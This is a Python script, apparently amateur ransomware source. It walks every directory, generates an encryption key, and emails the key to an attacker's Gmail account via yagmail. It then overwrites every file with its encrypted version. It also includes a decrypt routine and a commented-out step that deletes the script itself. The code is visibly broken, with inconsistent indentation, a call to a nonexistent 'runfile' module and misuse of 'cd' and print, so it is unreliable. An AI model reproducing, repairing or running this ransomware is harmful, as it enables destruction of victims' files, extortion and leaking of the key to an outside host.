import subprocess
subprocess.run(["pip","install","cryptography.fernet"], capture_output = True).stdout.decode()
subprocess.run(["pwd"])
from cryptography.fernet import Fernet
import os 
def runfiles(): 
	
	pwd= subprocess.run(["cd"], capture_output = True).stdout.decode()
	path= subprocess.run(["ls","-R"], capture_output = True).stdout.decode()
	with open("allfiles.txt","w") as allfiles:
		allfiles.write(path)
	with open("allfiles.txt","r") as allfiles:
        	listfiles=[]
        	listfiles=allfiles.readlines()
	listfilesplus=[]
	for i in listfiles:
        	if (len(i)>3):
        		if (i[-2]==":"):
        			A=i[1:-2]
        			A=pwd[0:-1]+A
        			listfilesplus.append(A)
	return listfilesplus
#encryption
def encryptfilehani():
	key = Fernet. generate_key()
    
	subprocess.run(["pip","install","yagmail"])
	
	
	### send the key via a gmail account 
	import yagmail
	yag = yagmail.SMTP('write ur username of gmail that u want to send the key-logger here', 'password')
	contents = [key]
	### the gmail that u recieve  in 
	yag.send('another gamil that u want to recieve  the key in @email.com', 'the key', contents)
        
        
        import runfile
        
        
        listofallfile=[]
        listofallfile=runfile()
        
        for i in listofallfile:
		subprocess.run(["cd",i])
		#filtre file
		files=[]
		for file in os.listdir():
    			if file == "encrypt.py" or file == "decrypt.py"  :
        			continue
    			else :
        			files.append(file)
      

    		for file in files :
        	with open(file,"rb") as thefile:
            		contents = thefile.read()
            		contents_encrypted= Fernet(key).encrypt(contents)
        	with open(file,"wb") as thefile:
            		thefile.write(contents_encrypted)
	return print("the encyption was completed ")
#decryption
def decryptfilehani(key):
    
	import runfile
        
	listofallfile=[]
	listofallfile=runfile()
	for i in listofallfile:
		subprocess.run(["cd",i])
		#filtre file
		files=[]
		for file in os.listdir():
    			if file == "encrypt.py" or file == "decrypt.py" or file=="keylogger.key" :
        			continue
    			else :
        			files.append(file)
        	for file in files :
        		with open(file,"rb") as thefile:
            			contents = thefile.read()
            			contents_decrypted= Fernet(key).decrypt(contents)
        		with open(file,"wb") as thefile:
            			thefile.write(contents_decrypted)
            
       return print("have fun")
    

"""encryptfilehani()
mainfile=path+"global_encryption"   ### NB: u should put the name of script here nd make sure that was correct
subprocess.run(["rm",mainfile], capture_output = True).stdout.decode()
"""
"""key=print("write the key that i send to u")   
decryptfilehani(key)
"""

